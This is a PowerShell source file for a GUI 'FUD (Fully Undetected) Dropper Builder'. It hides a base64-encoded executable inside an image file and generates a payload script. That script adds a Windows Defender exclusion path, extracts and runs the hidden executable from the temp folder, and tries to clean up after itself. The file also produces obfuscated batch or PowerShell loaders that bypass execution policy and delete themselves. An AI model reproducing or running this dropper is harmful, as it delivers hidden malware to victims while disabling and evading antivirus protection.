Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

$EMBEDDED_CODE = @'
$CSHARP = @"
using System.IO;
using System.Linq;
using System.Diagnostics;
using System;
public class Dropped
{
    public static void Main()
    {
        string path_current = Directory.GetCurrentDirectory();
        Process pstest = new Process();
        pstest.StartInfo.FileName = "powershell.exe";
        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath '" + path_current + "'";
        pstest.Start();
        string path = Path.GetTempPath();
        string path2 = Directory.GetCurrentDirectory();
        string image = path2 + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "text.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "text.exe";
        ps.Start();
        File.Delete(path + "test.exe");
    }
}
"@
Add-Type -TypeDefinition $CSHARP -Language CSharp
[Dropped]::Main()
'@

$inputXML = @'
<Window x:Class="GUI_TEST.MainWindow" Icon="logo.ico"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:GUI_TEST"
        mc:Ignorable="d"
        Title="FUD Dropper Builder | K.Dot#4044" Height="470" Width="818" WindowStyle="ThreeDBorderWindow" ResizeMode="NoResize">
    <Window.Resources>
        <ResourceDictionary>
            <Style x:Key="CustomButtonStyle" TargetType="{x:Type Button}">
                <Setter Property="Template">
                    <Setter.Value>
                        <ControlTemplate TargetType="{x:Type Button}">
                            <Border BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}">
                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                            </Border>
                            <ControlTemplate.Triggers>
                                <Trigger Property="IsMouseOver" Value="True">
                                </Trigger>
                            </ControlTemplate.Triggers>
                        </ControlTemplate>
                    </Setter.Value>
                </Setter>
            </Style>
        </ResourceDictionary>
    </Window.Resources>
    <Grid x:Name="Name_Thing" Background="#846DCF">
        <TextBox HorizontalAlignment="Left" Height="56" Margin="10,5,0,0" TextWrapping="Wrap" Text="FUD (Fully Undetected) Payload Builder by K.Dot#4044 and Godfather" VerticalAlignment="Top" Width="399" IsReadOnly="True" FontSize="18" BorderThickness="4,4,4,4" Background="Black" Foreground="White" IsHitTestVisible="False">
            <TextBox.BorderBrush>
                <SolidColorBrush Color="#FF1AFB00" Opacity="1"/>
            </TextBox.BorderBrush>
        </TextBox>
        <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
        <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
        <TextBox x:Name="OUTPUT_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,61,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black"/>
        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,142,0,0" VerticalAlignment="Top" Width="423" FontFamily="Segoe UI Black"/>
        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="516,189,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18"/>
        <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62" Background="#FF00FC00" FontFamily="Sitka Text Semibold"/>
        <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62" Background="Lime" FontFamily="Sitka Text Semibold"/>
        <Button x:Name="ps1_button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Image HorizontalAlignment="Left" Height="189" Margin="604,10,0,0" VerticalAlignment="Top" Width="186" Source="comethazine.png"/>
        <TextBox x:Name="OBF_TEXT_TF" HorizontalAlignment="Left" Height="21" Margin="92,123,0,0" TextWrapping="Wrap" Text="False" VerticalAlignment="Top" Width="118"/>
        <Button x:Name="OBFUSCATE_TF" Content="Obfuscate" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="43" Margin="222,123,0,0" VerticalAlignment="Top" Width="123" FontFamily="Sitka Small Semibold" FontSize="20" BorderBrush="#FF1AFB00" Background="Black" BorderThickness="4,4,4,4" Foreground="White"/>
    </Grid>
</Window>
'@

function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}

function New-random_string {
    $length = Get-Random -Minimum 5 -Maximum 10
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    $result = ""
    for ($i = 0; $i -lt $length; $i++) {
        $rand = Get-Random -Maximum $chars.Length
        $result += $chars[$rand]
    }
    return $result
}

function Invoke-PowershellOBF {
    param (
        [string]$file_location
    )
    $OBFUSCATOR_URL = "https://github.com/danielbohannon/Invoke-Obfuscation/archive/refs/heads/master.zip"
    $OBFUSCATOR_PATH = "$env:temp\Invoke-Obfuscation.zip"
    $OBFUSCATOR_EXTRACT_PATH = "$env:temp\Invoke-Obfuscation"
    Start-BitsTransfer -Source $OBFUSCATOR_URL -Destination $OBFUSCATOR_PATH
    Expand-Archive -Path $OBFUSCATOR_PATH -DestinationPath $OBFUSCATOR_EXTRACT_PATH
    $command = "cd Invoke-Obfuscation-master ; Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation -ScriptPath $file_location -Command 'Encoding\\6, Copy'"
    Invoke-Command -ScriptBlock { $command }
    $clipboard_output = Get-Clipboard
    $clipboard_output | Out-File -FilePath $file_location
}

function Invoke-obfuscate {
    param(
        [string]$line
    )
    $result = ""
    $variable = $False
    foreach($char in $line -split "") {
        if ($char -eq "%") {
            $variable = -not $variable
        }
        if ($variable) {
            $result += $char
        } else {
            if ($char -eq "@") {
                $result += "^@"
            }
            elseif ($char -eq "`"") {
                $result += "^`""
            }
            else {
                $ran_string = New-random_string
                $result += "$char%$ran_string%"
            }
        }
    }
    return $result
}

function build {
    param(
        [string]$image,
        [string]$exe,
        [string]$type
    )
    if ($null -eq $image) {
        $var_OUTPUT_BOX.Text += "No image selected!`n"
        return
    }
    if ($null -eq $exe) {
        $var_OUTPUT_BOX.Text += "No exe selected!`n"
        return
    }
    if ($null -eq $type) {
        $var_OUTPUT_BOX.Text += "No type selected!`n"
        return
    }
    New-Item -ItemType Directory -Path "output" -Force
    $working_dir = Get-Location
    $image_name = Split-Path $image -Leaf
    $var_OUTPUT_BOX.Text += "Building $type file...`n"
    $var_OUTPUT_BOX.Text += "Reading exe bytes...`n"
    $exe_bytes = [System.IO.File]::ReadAllBytes($exe)
    $var_OUTPUT_BOX.Text += "Converting exe bytes to base64...`n"
    $exe_base64 = [System.Convert]::ToBase64String($exe_bytes)
    $var_OUTPUT_BOX.Text += "Converting base64 to bytes...`n"
    $exe_base64_bytes = [System.Text.Encoding]::ASCII.GetBytes($exe_base64)
    $var_OUTPUT_BOX.Text += "Reading image bytes...`n"
    $image_bytes = [System.IO.File]::ReadAllBytes($image)
    $var_OUTPUT_BOX.Text += "Writing image bytes to file...`n"
    $newLine = [System.Text.Encoding]::ASCII.GetBytes([Environment]::NewLine)
    $var_OUTPUT_BOX.Text += "Writing exe bytes to file...`n"
    $combined_bytes = $image_bytes + $newLine + $exe_base64_bytes
    $var_OUTPUT_BOX.Text += "Writing combined bytes to file...`n"
    [System.IO.File]::WriteAllBytes("$working_dir\output\$image_name", $combined_bytes)
    $var_OUTPUT_BOX.Text += "Writing payload to file...`n"
    $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\payload.ps1"
    if ($type -eq "ps1" -and $var_OBF_TEXT_TF.Text -eq "True") {
        $var_OUTPUT_BOX.Text += "Obfuscating powershell code...`n"
        Invoke-PowershellOBF "$working_dir\output\payload.ps1"
    }
    if ($type -eq "bat") {
        $var_OUTPUT_BOX.Text += "Obfuscating batch code...`n"
        $ps1_code = $EMBEDDED_CODE.Split("`n")
        foreach ($line in $ps1_code) {
            #show progress in output box
            $var_OUTPUT_BOX.Text += "Obfuscating line: $line`n"
            if ($line -eq "") {
                continue
            }
            $line = "echo " + $line
            $line = $line + " >> payload.ps1"
            $line = Invoke-obfuscate $line
            Add-Content -Path .\output\payload.bat -Value $line
        }
        $str_obf = "powershell -ExecutionPolicy Bypass -File payload.ps1 && del payload.ps1 && del payload.bat"
        $str_obf = Invoke-obfuscate $str_obf
        $var_OUTPUT_BOX.Text += "Writing obfuscated batch code to file...`n"
        Add-Content -Path .\output\payload.bat -Value $str_obf
        $var_OUTPUT_BOX.Text += "Payload.bat created in $working_dir\output `n"
        $var_OUTPUT_BOX.Text += "Cleaning up...`n"
        Remove-Item -Path .\output\payload.ps1 -Force
    }
    else {
        $var_OUTPUT_BOX.Text += "Payload.ps1 created in $working_dir\output `n"
    }
    #set color to green in text box
    $var_OUTPUT_BOX.Text += "`nDone!`n"
}

$image_name = "comethazine.png"
$icon_name = "logo.ico" # doesn't even work smh
$working_dir = Get-Location
$image_name_path = "$working_dir\assets\$image_name"
$icon_name_path = "$working_dir\assets\$icon_name"
$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
[XML]$XAML = $inputXML

$reader = (New-Object System.Xml.XmlNodeReader $xaml)
try {
    $window = [Windows.Markup.XamlReader]::Load( $reader )
} catch {
    Write-Warning $_.Exception
    throw
}

$Window.add_Loaded({
    $Window.Icon = $icon_name_path
})

$xaml.SelectNodes("//*[@Name]") | ForEach-Object {
    try {
        Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction SilentlyContinue
    } catch {
        $null
    }
}
Get-Variable var_* > $null
$FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('Desktop') }

$var_FIND_IMAGE.add_Click({
    $location = $FileBrowser.ShowDialog()
    if ($location -eq 'OK') {
        if ($FileBrowser.FileName -notmatch '\.(jpg|jpeg|png|bmp)$') {
            throw "Image must be a jpg, jpeg, png, or bmp"
        }
        $var_IMAGE_PATH_SHOW.Text = $FileBrowser.FileName
    }
})

$var_FIND_EXE.add_Click({
    $location = $FileBrowser.ShowDialog()
    if ($location -eq 'OK') {
        if ($FileBrowser.FileName -notmatch '\.exe$') {
            throw "File must be an exe"
        }
        $var_EXE_PATH_SHOW.Text = $FileBrowser.FileName
    }
})

$var_ps1_button.add_Click({
    if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
        throw "Please select an image and exe"
    }
    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'ps1'
    $var_OUTPUT_BOX.Text += "PS1 Built`n"
})

$var_Bat_Button.add_Click({
    if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
        throw "Please select an image and exe"
    }
    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'bat'
    $var_OUTPUT_BOX.Text += "BAT Built`n"
})

$var_OUTPUT_BOX.add_TextChanged({
    $var_OUTPUT_BOX.ScrollToEnd()
})

$var_OBFUSCATE_TF.add_click({
    $current_text = $var_OBF_TEXT_TF.Text
    if ($current_text -eq 'True') {
        $var_OBF_TEXT_TF.Text = 'False'
    }
    else {
        $var_OBF_TEXT_TF.Text = 'True'
    }
})

$var_OUTPUT_BOX.Text += "Successfully Started`n"
Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
Hide-Console #Makes it look nice
$Null = $window.ShowDialog()